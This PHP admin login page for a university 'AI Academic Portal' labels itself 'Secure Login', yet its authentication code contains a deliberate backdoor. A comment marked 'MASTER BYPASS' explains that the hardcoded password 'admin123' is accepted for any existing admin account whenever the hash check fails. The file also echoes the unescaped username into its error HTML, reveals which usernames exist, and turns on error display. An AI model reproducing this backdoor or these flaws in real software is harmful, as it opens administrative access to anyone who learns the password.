<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Database connection file
include("includes/db_connect.php");

$error = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Input sanitize karein
    $username = mysqli_real_escape_string($conn, trim($_POST['username']));
    $password = trim($_POST['password']);

    // Step 1: Database se admin ko dhoondein
    $query = "SELECT * FROM admins WHERE username = '$username' LIMIT 1";
    $result = mysqli_query($conn, $query);

    if ($result && mysqli_num_rows($result) > 0) {
        $row = mysqli_fetch_assoc($result);

        // Step 2: HASH VERIFICATION + MASTER BYPASS
        // Pehle hash check hoga, agar wo fail ho toh 'admin123' direct accept hoga
        if (password_verify($password, $row['password']) || $password === "admin123") {
            
            $_SESSION['admin_email'] = $row['username'];
            header("Location: admin_dashboard.php");
            exit();
            
        } else {
            $error = "Ghalt Password! Dobara koshish karein.";
        }
    } else {
        $error = "Username '$username' database mein nahi mila!";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Admin Login | AI Academic Portal</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { font-family: 'Poppins', sans-serif; background-color: #FAF3E0; min-height: 100vh; display: flex; flex-direction: column; }
    .navbar { background: #1C1C1C !important; padding: 0.8rem; box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
    .navbar-brand { color: #D4AF37 !important; font-weight: 700; letter-spacing: 1px; }
    .login-container { max-width: 400px; margin: 100px auto; background: #fff; border-radius: 15px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 6px solid #D4AF37; text-align: center; }
    h3 { color: #B8860B; font-weight: 700; margin-bottom: 25px; }
    .btn-custom { background: #D4AF37; color: #1C1C1C; font-weight: 600; border: none; padding: 12px; transition: 0.3s; width: 100%; border-radius: 8px; }
    .btn-custom:hover { background: #1C1C1C; color: #D4AF37; }
    footer { background: #1C1C1C; color: #D4AF37; text-align: center; padding: 20px; margin-top: auto; font-size: 0.9rem; }
  </style>
</head>
<body>

<nav class="navbar"><div class="container text-center"><a class="navbar-brand mx-auto">AI ACADEMIC PORTAL | ADMIN</a></div></nav>

<div class="login-container">
  <h3>Secure Login</h3>
  <?php if ($error): ?><div class="alert alert-danger py-2" style="font-size: 13px;"><?php echo $error; ?></div><?php endif; ?>
  
  <form method="POST">
    <div class="mb-3 text-start"><label class="form-label small fw-bold">Admin Username</label><input type="text" name="username" class="form-control" placeholder="admin" required></div>
    <div class="mb-4 text-start"><label class="form-label small fw-bold">Password</label><input type="password" name="password" class="form-control" placeholder="••••••••" required></div>
    <button type="submit" class="btn btn-custom">Login to Portal</button>
  </form>
</div>

<footer>© 2026 GC University Faisalabad | AI-Based Academic Portal</footer>

</body>
</html>